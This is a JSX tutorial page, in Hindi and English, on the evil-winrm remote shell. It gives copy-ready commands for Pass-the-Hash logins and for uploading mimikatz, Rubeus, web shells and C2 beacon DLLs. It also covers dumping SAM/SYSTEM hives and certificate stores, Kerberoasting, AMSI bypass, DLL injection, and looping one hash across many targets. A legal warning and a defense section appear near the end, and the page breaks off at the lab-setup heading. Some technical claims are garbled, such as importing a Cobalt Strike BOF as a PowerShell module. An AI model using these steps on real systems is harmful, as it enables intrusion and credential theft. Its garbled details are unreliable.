import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function EvilWinrm() {
  return (
    <TutorialLayout
      title="evil-winrm"
      subtitle="Windows Remote Management शेल — स्टील्थी रिमोट एक्सेस और पोस्ट-एक्सप्लॉइटेशन"
      icon="🖥️"
      prev={{ to: '/tool/chisel', label: 'chisel' }}
      next={{ to: '/tool/subfinder', label: 'subfinder' }}
    >
      <h2>What is Evil-WinRM?</h2>
      <p>
        Evil-WinRM Windows Remote Management (WinRM) protocol पर based एक powerful remote shell tool है जो penetration testers और red team operators को Windows machines पर stealthy remote access प्रदान करता है। यह PSExec, WMI, या RDP का बेहतर alternative है क्योंकि WinRM Windows का legitimate built-in remote management protocol है जो PowerShell remoting के लिए use होता है। Evil-WinRM इस protocol का फायदा उठाकर undetectable तरीके से remote access देता है।
      </p>
      <p>
        Evil-WinRM को Hackplayers team ने Ruby में लिखा है और यह port 5985 (HTTP) और 5986 (HTTPS) पर connect करता है। इसकी सबसे बड़ी खासियत है Pass-the-Hash support — password की ज़रूरत नहीं, सिर्फ NTLM hash से connect हो सकते हो। यह Active Directory environments में post-exploitation और lateral movement के लिए बहुत useful है। WinRM legitimate Windows service है, इसलिए यह PSExec या WMI की तुलना में बहुत ज़्यादा stealthy है।
      </p>
      <p>
        Evil-WinRM कई advanced features provide करता है — file upload/download, PowerShell script execution (memory में), DLL injection, AMSI bypass, Kerberos authentication, और certificate-based authentication। यह tools का एक complete post-exploitation framework है जो red team operations में standard tool बन गया है। Kali Linux में यह pre-installed आता है और GitHub पर 4,000+ stars हैं।
      </p>
      <p>
        WinRM protocol HTTP/HTTPS पर काम करता है जो normal web traffic की तरह दिखता है। इसलिए firewalls और IDS/IPS systems इसे आसानी से detect नहीं कर पाते। Evil-WinRM इस stealthiness को और बढ़ाता है — in-memory script execution, no disk writes, और encrypted communication। यह Windows post-exploitation का सबसे clean और reliable tool है।
      </p>
      <p>
        यह टूल specifically Windows environments के लिए design किया गया है — Windows 10, 11, Server 2016, 2019, 2022 सब support करता है। Active Directory domain environments में यह बेहद powerful है क्योंकि domain credentials या hashes से किसी भी domain-joined machine पर access मिल सकता है। Red team operations में lateral movement का यह primary tool है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Evil-WinRM केवल अधिकृत पेनेट्रेशन टेस्टिंग और Red Team operations में ही इस्तेमाल करें। अनधिकृत रिमोट एक्सेस अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत कंप्यूटर एक्सेस में 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of Evil-WinRM</h2>
      <p>
        Evil-WinRM को 2019 में Hackplayers team ने develop किया था। Hackplayers एक Spanish security research group है जो penetration testing tools बनाती है। उस समय WinRM-based remote access tools की कमी थी — PSExec और WMI तो थे, लेकिन WinRM के लिए dedicated tool नहीं था। Evil-WinRM ने यह gap fill किया और quickly red team community में popular हो गया।
      </p>
      <p>
        Ruby में लिखे होने के बावजूद Evil-WinRM बहुत fast और reliable है। Hackplayers ने continuous updates दिए — 2019 में basic version, 2020 में Pass-the-Hash support, 2021 में Kerberos authentication, और 2022 में AMSI bypass features add किए। आज यह हर penetration tester और red teamer के toolkit में शामिल है। GitHub पर इसके 4,500+ stars हैं और actively maintained है।
      </p>
      <p>
        Evil-WinRM का design philosophy simple है — WinRM protocol का maximum exploitation करो, लेकिन stealthy रहो। यह Windows के legitimate remote management infrastructure का abuse करता है, जिससे defenders के लिए detect करना मुश्किल होता है। यही कारण है कि red teams PSExec छोड़कर Evil-WinRM prefer करते हैं।
      </p>

      <h2>How Evil-WinRM Works?</h2>
      <p>
        Evil-WinRM Windows Remote Management (WinRM) protocol का उपयोग करके remote Windows machines पर PowerShell commands execute करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WinRM Protocol:</strong> Windows का built-in remote management protocol जो port 5985 (HTTP) और 5986 (HTTPS) पर listen करता है। यह WS-Management standard पर based है</li>
        <li><strong className="text-white">PowerShell Remoting:</strong> WinRM PowerShell commands remotely execute करने देता है — पूरा PowerShell environment मिलता है</li>
        <li><strong className="text-white">NTLM Authentication:</strong> Username/password या NTLM hash दोनों से authenticate करता है। Pass-the-Hash attack support करता है</li>
        <li><strong className="text-white">HTTP/HTTPS Communication:</strong> Normal web traffic की तरह दिखता है — firewalls और IDS easily detect नहीं कर पाते</li>
        <li><strong className="text-white">Ruby WinRM Gem:</strong> Ruby library जो WinRM protocol implement करती है — wsman, ntlm, httpauth gems use होते हैं</li>
        <li><strong className="text-white">File Transfer Streams:</strong> WinRM SOAP message streams के through files upload/download करता है — Base64 encoded</li>
        <li><strong className="text-white">In-Memory Execution:</strong> PowerShell scripts memory में load और execute होते हैं — disk पर कुछ write नहीं होता</li>
        <li><strong className="text-white">Session Management:</strong> Persistent shell session maintain करता है — multiple commands sequentially execute कर सकते हो</li>
      </ul>
      <p>
        Evil-WinRM का workflow यह है: पहले Ruby WinRM gem target machine से HTTP/HTTPS connection establish करता है। NTLM authentication होती है — password या hash दोनों से। Connection establish होने पर एक interactive PowerShell shell मिलता है जहाँ से कोई भी Windows command execute कर सकते हो। File transfer Base64 encoding से होता है — files SOAP messages में embed होते हैं।
      </p>

      <h2>Installation</h2>
      <p>
        Evil-WinRM install करना आसान है — Ruby gem, GitHub source, या Kali Linux pre-installed package से। Ruby 2.5+ चाहिए और winrm, winrm-fs gems install होने चाहिए।
      </p>
      <CodeBlock
        title="Evil-WinRM इंस्टॉलेशन"
        code={`# Ruby gem से (सबसे आसान):
gem install evil-winrm

# GitHub से (latest version):
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install winrm winrm-fs stringio

# Kali Linux में pre-installed:
evil-winrm --version

# Dependencies install (अगर error आए):
sudo apt install ruby ruby-dev build-essential
sudo gem install winrm winrm-fs stringio

# Version check:
evil-winrm --version

# Help:
evil-winrm --help

# Ruby version check (2.5+ चाहिए):
ruby --version

# सभी gems check:
gem list | grep winrm`}
      />

      <h2>Basic Usage</h2>
      <p>
        Evil-WinRM से connect करना simple है — target IP, credentials या hash provide करो। Connection establish होने पर interactive PowerShell shell मिलता है जहाँ से कोई भी Windows command execute कर सकते हो।
      </p>
      <CodeBlock
        title="Basic Connection Examples"
        code={`# Username/Password से connect:
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123'

# NTLM Hash से connect (Pass-the-Hash):
evil-winrm -i 192.168.1.100 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# SSL encrypted connection (port 5986):
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123' -S

# Custom port:
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123' -P 5986

# Domain user से connect:
evil-winrm -i 192.168.1.100 -u 'DOMAIN\\\\admin' -p 'Password123'

# Domain user + Pass-the-Hash:
evil-winrm -i 192.168.1.100 -u 'DOMAIN\\\\admin' -H 'NTHASH'

# Script directory load करके connect:
evil-winrm -i 192.168.1.100 -u administrator -p 'Pass' -s /opt/scripts/

# Single script load करके connect:
evil-winrm -i 192.168.1.100 -u administrator -p 'Pass' -s /opt/scripts/bypass.ps1

# Executable load करके connect:
evil-winrm -i 192.168.1.100 -u administrator -p 'Pass' -e /opt/tools/mimikatz.exe

# Hostname check disable:
evil-winrm -i 192.168.1.100 -u administrator -p 'Pass' -n`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i IP</td><td className="py-2 px-3">Target IP address या hostname</td><td className="py-2 px-3 font-mono text-xs">-i 192.168.1.100</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-u user</td><td className="py-2 px-3">Username (domain\\\\user format)</td><td className="py-2 px-3 font-mono text-xs">-u 'DOMAIN\\\\admin'</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p pass</td><td className="py-2 px-3">Password (single quotes में)</td><td className="py-2 px-3 font-mono text-xs">-p 'P@ssw0rd'</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-H hash</td><td className="py-2 px-3">NTLM hash (Pass-the-Hash)</td><td className="py-2 px-3 font-mono text-xs">-H 'LM:NTHash'</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-P port</td><td className="py-2 px-3">Custom port (default 5985)</td><td className="py-2 px-3 font-mono text-xs">-P 5986</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-S</td><td className="py-2 px-3">SSL enable (port 5986)</td><td className="py-2 px-3 font-mono text-xs">-S</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s script.ps1</td><td className="py-2 px-3">Startup PowerShell script/directory</td><td className="py-2 px-3 font-mono text-xs">-s /opt/scripts/</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-e exefile.exe</td><td className="py-2 px-3">Startup executable file</td><td className="py-2 px-3 font-mono text-xs">-e /opt/tools/nc.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-k keytab</td><td className="py-2 px-3">Kerberos keytab file path</td><td className="py-2 px-3 font-mono text-xs">-k /path/to/keytab</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-n</td><td className="py-2 px-3">Disable hostname SSL check</td><td className="py-2 px-3 font-mono text-xs">-n</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c cert.pem</td><td className="py-2 px-3">Client certificate file</td><td className="py-2 px-3 font-mono text-xs">-c cert.pem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-r key.pem</td><td className="py-2 px-3">Client private key file</td><td className="py-2 px-3 font-mono text-xs">-r key.pem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--spn SPN</td><td className="py-2 px-3">Kerberos Service Principal Name</td><td className="py-2 px-3 font-mono text-xs">--spn HTTP/target</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-V</td><td className="py-2 px-3">Verbose output (debug)</td><td className="py-2 px-3 font-mono text-xs">-V</td></tr>
          </tbody>
        </table>
      </div>

      <h2>File Upload and Download</h2>
      <p>
        Evil-WinRM shell में files upload और download करना बहुत आसान है। यह WinRM SOAP message streams का उपयोग करता है — files Base64 encoded होकर transfer होते हैं। Upload attacker machine से target पर और download target से attacker machine पर होता है। Binary files (EXE, DLL) भी transfer हो सकते हैं।
      </p>
      <CodeBlock
        title="File Transfer Commands"
        code={`# Evil-WinRM connected shell में:

# === UPLOAD (attacker → target) ===
upload /tmp/mimikatz.exe C:\\\\temp\\\\mimikatz.exe
upload /tmp/nc.exe C:\\\\temp\\\\nc.exe
upload /tmp/shell.ps1 C:\\\\temp\\\\shell.ps1
upload /tmp/Rubeus.exe C:\\\\temp\\\\Rubeus.exe
upload /tmp/SharpHound.exe C:\\\\temp\\\\SharpHound.exe

# Current directory में upload:
upload /tmp/payload.dll .\\\\payload.dll

# === DOWNLOAD (target → attacker) ===
download C:\\\\Windows\\\\System32\\\\config\\\\SAM /tmp/SAM
download C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM /tmp/SYSTEM
download C:\\\\Users\\\\admin\\\\Desktop\\\\flag.txt /tmp/flag.txt
download C:\\\\inetpub\\\\wwwroot\\\\web.config /tmp/web.config
download C:\\\\Windows\\\\debug\\\\NetSetup.log /tmp/netsetup.log

# === PRACTICAL FILE TRANSFER SCENARIOS ===

# Mimikatz upload करके credential dump:
upload /opt/tools/mimikatz.exe C:\\\\temp\\\\m.exe
# Shell में: C:\\\\temp\\\\m.exe "privilege::debug" "sekurlsa::logonpasswords"

# SAM/SYSTEM download (offline hash cracking):
download C:\\\\Windows\\\\System32\\\\config\\\\SAM /tmp/SAM
download C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM /tmp/SYSTEM
# Impacket से: secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL

# Web shell upload:
upload /opt/shells/cmd.aspx C:\\\\inetpub\\\\wwwroot\\\\cmd.aspx

# Config files download (sensitive data):
download C:\\\\Windows\\\\Panther\\\\unattend.xml /tmp/unattend.xml
download C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\Machine\\\\Registry.pol /tmp/reg.pol`}
      />

      <h2>PowerShell Script Execution</h2>
      <p>
        Evil-WinRM का सबसे powerful feature है PowerShell scripts को directly memory में load और execute करना। Scripts disk पर write नहीं होते — सिर्फ memory में run होते हैं जिससे antivirus detect नहीं कर पाता। -s flag से startup scripts load कर सकते हो, या connected shell में Import-Module से।
      </p>
      <CodeBlock
        title="PowerShell Script Execution"
        code={`# Evil-WinRM connected shell में:

# === BUILT-IN COMMANDS ===
# Bypass-AMSI — antivirus evasion
# Invoke-BloodHound — AD enumeration
# Invoke-Mimikatz — credential dumping
# Invoke-Kerberoast — Kerberoasting

# === STARTUP SCRIPTS (-s flag) ===
# Single script load:
evil-winrm -i IP -u user -p pass -s /opt/scripts/bypass-amsi.ps1

# Directory load (सभी .ps1 files):
evil-winrm -i IP -u user -p pass -s /opt/scripts/

# Multiple scripts combine:
# 1. AMSI bypass script
# 2. Mimikatz script
# 3. BloodHound script

# === IMPORT MODULES (shell में) ===
# Local script import:
Import-Module /local/path/script.ps1

# Remote script import (target से):
Import-Module C:\\\\temp\\\\loaded_script.ps1

# Function call:
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-BloodHound -CollectionMethod All -Domain lab.local

# === ADVANCED SCRIPT LOADING ===
# Cobalt Strike BOF load:
Import-Module /opt/cobalt/BOF/cred_bof.x64.o

# Custom script with parameters:
$cred = Get-Credential
Invoke-Command -ScriptBlock { Get-Process } -Credential $cred

# Script block execute:
powershell -enc <base64_encoded_command>`}
      />

      <h2>DLL Injection</h2>
      <p>
        Evil-WinRM DLL files को target system पर upload और inject कर सकता है। यह advanced post-exploitation के लिए useful है — custom payloads, C2 agents, और specialized tools inject करने के लिए। DLL injection से code legitimate process के context में run होता है जिससे detection मुश्किल होता है।
      </p>
      <CodeBlock
        title="DLL Injection Techniques"
        code={`# Evil-WinRM connected shell में:

# === BASIC DLL INJECTION ===
# DLL upload करें:
upload /tmp/mimikatz.dll C:\\\\temp\\\\mimikatz.dll

# PowerShell से DLL load:
$bytes = [System.IO.File]::ReadAllBytes("C:\\\\temp\\\\mimikatz.dll")
[System.Reflection.Assembly]::Load($bytes)

# === REFLECTIVE DLL INJECTION ===
# Memory में directly load (disk write नहीं):
$bytes = [System.IO.File]::ReadAllBytes("C:\\\\temp\\\\payload.dll")
[System.Reflection.Assembly]::Load($bytes)

# === PROCESS INJECTION ===
# Target process find करें:
Get-Process | Where-Object {$_.ProcessName -like "*explorer*"}

# DLL inject करें:
Invoke-DllInjection -ProcessId 1234 -Dll C:\\\\temp\\\\payload.dll

# === RUNDLL32 EXECUTION ===
# DLL execute rundll32 से:
upload /tmp/beacon.dll C:\\\\temp\\\\beacon.dll
Start-Process rundll32.exe -ArgumentList "C:\\\\temp\\\\beacon.dll,EntryPoint"

# === COBALD STRIKE BEACON ===
upload /tmp/beacon.dll C:\\\\temp\\\\beacon.dll
rundll32.exe C:\\\\temp\\\\beacon.dll,DllMain

# === CUSTOM C2 AGENT ===
upload /tmp/agent.dll C:\\\\temp\\\\agent.dll
[System.Reflection.Assembly]::LoadFile("C:\\\\temp\\\\agent.dll")
[Agent.Program]::Main()`}
      />

      <h2>Kerberos Authentication</h2>
      <p>
        Active Directory environments में Evil-WinRM Kerberos authentication support करता है। यह keytab files और ccache tickets दोनों से authenticate कर सकता है। Kerberos auth stealthier है NTLM की तुलना में क्योंकि यह domain का native authentication protocol है।
      </p>
      <CodeBlock
        title="Kerberos Authentication Setup"
        code={`# === KERBEROS TICKET GENERATE ===

# Impacket से TGT generate:
impacket-getTGT lab.local/administrator:'Password123'

# KRB5CCNAME environment variable set:
export KRB5CCNAME=/tmp/administrator.ccache

# Keytab file generate (from password):
impacket-keytab administrator:'Password123'@LAB.LOCAL /tmp/admin.keytab

# === EVIL-WINRM KERBEROS AUTH ===

# Keytab file से connect:
evil-winrm -i dc01.lab.local -u administrator -k /tmp/admin.keytab

# Ccache file से connect:
evil-winrm -i dc01.lab.local -u administrator -k /tmp/admin.ccache

# Domain controller direct connect:
evil-winrm -i dc01.lab.local -u 'LAB\\\\admin' -p 'Password123'

# === KERBEROASTING WORKFLOW ===
# 1. Evil-WinRM से initial access
# 2. Rubeus upload करें
# 3. Kerberoast:
upload /opt/tools/Rubeus.exe C:\\\\temp\\\\Rubeus.exe
C:\\\\temp\\\\Rubeus.exe kerberoast /outfile:C:\\\\temp\\\\hashes.txt
download C:\\\\temp\\\\hashes.txt /tmp/hashes.txt
# 4. Hashcat से crack:
hashcat -m 13100 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt

# === AS-REP ROASTING ===
C:\\\\temp\\\\Rubeus.exe asreproast /outfile:C:\\\\temp\\\\asrep.txt`}
      />

      <h2>Certificate Authentication</h2>
      <p>
        Evil-WinRM client certificate authentication support करता है। यह password-less authentication का secure तरीका है। Certificate-based auth में private key compromise नहीं होता — सिर्फ certificate file share करना होता है। Enterprise environments में यह preferred authentication method है।
      </p>
      <CodeBlock
        title="Certificate Authentication"
        code={`# === CERTIFICATE GENERATE ===

# Self-signed certificate generate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# PFX format में convert:
openssl pkcs12 -export -out client.pfx -inkey key.pem -in cert.pem

# === EVIL-WINRM CERTIFICATE AUTH ===

# Certificate से connect:
evil-winrm -i target_ip -c cert.pem -r key.pem -S

# Custom certificate directory:
# Evil-WinRM ~/.evil-winrm/ directory से certificates auto-load करता है
mkdir -p ~/.evil-winrm
cp cert.pem ~/.evil-winrm/
cp key.pem ~/.evil-winrm/

# === ENTERPRISE CERTIFICATE AUTH ===
# AD CS (Active Directory Certificate Services) से certificate request:
# 1. CSR generate करें
# 2. AD CA से sign कराएं
# 3. Evil-WinRM से connect

# === CERTIFICATE THEFT ===
# Machine certificate steal करें:
download C:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys /tmp/keys
# या user certificate:
download C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates /tmp/certs`}
      />

      <h2>Pass-the-Hash Attack</h2>
      <p>
        Evil-WinRM का सबसे powerful और popular feature है Pass-the-Hash — NTLM hash से directly authenticate करना। Password crack करने की ज़रूरत नहीं, hash directly use होता है। यह lateral movement का सबसे fast तरीका है — hash मिलते ही तुरंत access मिल जाता है।
      </p>
      <CodeBlock
        title="Pass-the-Hash Detailed"
        code={`# === HASH FORMAT ===
# LMHash:NTHash
# LM hash usually empty: aad3b435b51404eeaad3b435b51404ee
# Full format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# === BASIC PASS-THE-HASH ===
evil-winrm -i 192.168.1.100 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# === HASH SOURCES ===
# 1. Mimikatz से:
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# 2. SAM dump से:
reg save HKLM\\\\SAM C:\\\\temp\\\\SAM
reg save HKLM\\\\SYSTEM C:\\\\temp\\\\SYSTEM
download C:\\\\temp\\\\SAM /tmp/SAM
download C:\\\\temp\\\\SYSTEM /tmp/SYSTEM
secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL

# 3. NTDS.dit extract:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# 4. Responder से:
responder -I eth0
# Hash capture होने पर /opt/responder/logs/ में मिलेगा

# 5. CrackMapExec:
cme smb 192.168.1.100 -u administrator -H 'HASH' --sam

# === BATCH PASS-THE-HASH ===
# Multiple targets पर same hash try करें:
for ip in $(cat targets.txt); do
    echo "[+] Trying: $ip"
    evil-winrm -i $ip -u administrator -H 'HASH' -s /opt/scripts/bypass-amsi.ps1
done

# === LATERAL MOVEMENT WORKFLOW ===
# 1. Initial access (phishing/exploit)
# 2. Evil-WinRM से connect
# 3. Mimikatz/Rubeus से credentials dump
# 4. BloodHound data collect
# 5. नए hashes से दूसरी machines पर jump
# 6. Domain Admin hash प्राप्त करें`}
      />

      <h2>WinRM Enumeration</h2>
      <p>
        Evil-WinRM use करने से पहले target पर WinRM enable है या नहीं, यह check करना ज़रूरी है। Enumeration से WinRM configuration, authentication methods, और allowed users पता चलते हैं।
      </p>
      <CodeBlock
        title="WinRM Enumeration"
        code={`# === PORT SCAN ===
# Nmap से WinRM port check:
nmap -p 5985,5986 -sV target_ip

# Masscan से:
masscan -p5985,5986 target_range --rate=1000

# === WINRM SERVICE CHECK ===
# PowerShell (target पर):
winrm get winrm/config
winrm get winrm/config/service
winrm get winrm/config/listener

# Test-WSMan (remote check):
Test-WSMan -ComputerName target_ip
Test-WSMan -ComputerName target_ip -Port 5986 -UseSSL

# === CRACKMAPEXEC WINRM ENUM ===
# WinRM access check:
cme winrm target_ip -u user -p pass
cme winrm target_ip -u user -H 'HASH'

# WinRM modules:
cme winrm target_ip -u user -p pass -M enum_loggedon
cme winrm target_ip -u user -p pass -M spider_plus

# === NMAP WINRM SCRIPTS ===
nmap -p 5985 --script winrm-auth-methods target_ip
nmap -p 5986 --script winrm-auth-methods target_ip

# === AUTHENTICATION METHODS ===
# WinRM supports:
# 1. Basic Auth (username/password)
# 2. Negotiate (NTLM/Kerberos)
# 3. Kerberos (domain auth)
# 4. Certificate (client cert)
# 5. CredSSP (delegated credentials)`}
      />

      <h2>Evil-WinRM vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Evil-WinRM</th>
              <th className="text-left py-2 px-3 text-neon-green">PSExec</th>
              <th className="text-left py-2 px-3 text-neon-green">CrackMapExec</th>
              <th className="text-left py-2 px-3 text-neon-green">wmiexec</th>
              <th className="text-left py-2 px-3 text-neon-green">SSH</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Protocol</td><td className="py-2 px-3">WinRM (5985/5986)</td><td className="py-2 px-3">SMB (445)</td><td className="py-2 px-3">SMB/WMI/WinRM</td><td className="py-2 px-3">WMI (135)</td><td className="py-2 px-3">SSH (22)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Stealth</td><td className="py-2 px-3">High (legitimate)</td><td className="py-2 px-3">Low (service install)</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">High</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">PtH Support</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">File Transfer</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">SCP/SFTP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">PS Scripts</td><td className="py-2 px-3">Direct memory load</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (obfuscated)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">DLL Injection</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">AMSI Bypass</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">N/A</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Detection</td><td className="py-2 px-3">Low</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Low</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Windows Only</td><td className="py-2 px-3">Target only</td><td className="py-2 px-3">Target only</td><td className="py-2 px-3">Target only</td><td className="py-2 px-3">Target only</td><td className="py-2 px-3">No</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Easy</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Connection Refused (port 5985)', a: 'WinRM service target पर enable नहीं है। Nmap से port scan करो: nmap -p 5985,5986 target। WinRM enable करो: winrm quickconfig (target पर run करना होगा)। Firewall rule check करो: netsh advfirewall firewall show rule name=all | findstr 5985' },
          { q: 'Authentication Failed', a: 'Credentials गलत हो सकते हैं। NTLM hash format check करो — LMHash:NTHash format होना चाहिए। Domain name correctly specify करो: DOMAIN\\\\user। Double quotes की जगह single quotes use करो password में।' },
          { q: 'SSL Certificate Error', a: 'Self-signed certificate की वजह से error आता है। -n flag use करो (hostname check disable)। या -S flag से SSL enable करो। -P 5986 से HTTPS port specify करो।' },
          { q: 'File Upload बहुत Slow है', a: 'WinRM file transfer slow होता है SMB की तुलना में — Base64 encoding overhead। बड़ी files के लिए alternative methods use करो: certutil download, PowerShell Invoke-WebRequest, या SMB share mount।' },
          { q: 'PowerShell Script Load नहीं हो रहा', a: 'Script path check करो — absolute path use करो। Execution policy check करो: Set-ExecutionPolicy Bypass। Script syntax verify करो। -s flag से directory specify करो (सभी .ps1 auto-load होंगी)।' },
          { q: 'AMSI Detect कर रहा है Scripts को', a: 'पहले AMSI bypass run करो: Bypass-AMSI। या -s flag से bypass script startup में load करो। Custom obfuscated scripts use करो। In-memory execution prefer करो।' },
          { q: 'Kerberos Authentication Fail हो रहा', a: 'Time sync check करो — attacker और DC का time same होना चाहिए। DNS resolution check करो — DC का FQDN resolve होना चाहिए। KRB5CCNAME environment variable set करो। Keytab file valid है verify करो।' },
          { q: 'WinRM Port Open है लेकिन Connect नहीं हो रहा', a: 'WinRM listener configuration check करो: winrm get winrm/config/listener। Authentication methods check करो। Group Policy restrictions हो सकते हैं। Network-level authentication (NLA) enable है verify करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Evil-WinRM attacks से बचने के लिए comprehensive defense strategy ज़रूरी है:
      </p>
      <div className="space-y-3 mt-4">
        {[
          { title: 'WinRM Service Disable', desc: 'अगर ज़रूरत नहीं तो WinRM service completely disable रखें: Disable-PSRemoting -Force। GPO से enforce करें।' },
          { title: 'Firewall Rules', desc: 'Port 5985/5986 केवल trusted management IPs के लिए open करें। Windows Firewall: New-NetFirewallRule -Name "WinRM" -RemoteAddress "10.0.0.0/24" -Direction Inbound -LocalPort 5985,5986 -Protocol TCP -Action Allow' },
          { title: 'HTTPS Only (5986)', desc: 'HTTP (5985) disable करो, सिर्फ HTTPS (5986) allow करो। Certificate-based encryption mandatory। winrm set winrm/config/service @{AllowUnencrypted="false"}' },
          { title: 'Certificate Authentication Only', desc: 'Password-based auth disable करो — सिर्फ certificate authentication allow करो। winrm set winrm/config/service @{CertificateThumbprint="THUMBPRINT"}' },
          { title: 'WinRM Logging Enable', desc: 'Operational logging enable करो — Event IDs 6, 8, 91, 168, 169 important हैं। Microsoft-Windows-WinRM/Operational log monitor करो।' },
          { title: 'JEA (Just Enough Admin)', desc: 'Limited commands allow करो, full admin access न दें। JEA role definitions बनाओ जो specific tasks करने दें।' },
          { title: 'Network Segmentation', desc: 'Critical servers को separate VLAN में रखें। Management traffic dedicated network segment पर route करें।' },
          { title: 'Monitor WinRM Connections', desc: 'SIEM में WinRM connection alerts set करो — unusual source IPs, off-hours access, और failed auth attempts track करें।' },
          { title: 'Credential Guard', desc: 'Windows Credential Guard enable करो — LSASS memory protection। NTLM hash extraction मुश्किल होगी।' },
          { title: 'LAPS (Local Admin Password Solution)', desc: 'Unique local admin passwords per machine — same hash से सभी machines पर access नहीं मिलेगा।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">{item.title}</h4>
            <p className="text-gray-400 text-sm">{item.desc}</p>
          </div>
        ))}
      </div>

      <h2>Lab Environment Setup</h2>
      <p>
        Evil-WinRM practice के लिए complete Active Directory lab environment बनाना ज़रूरी है:
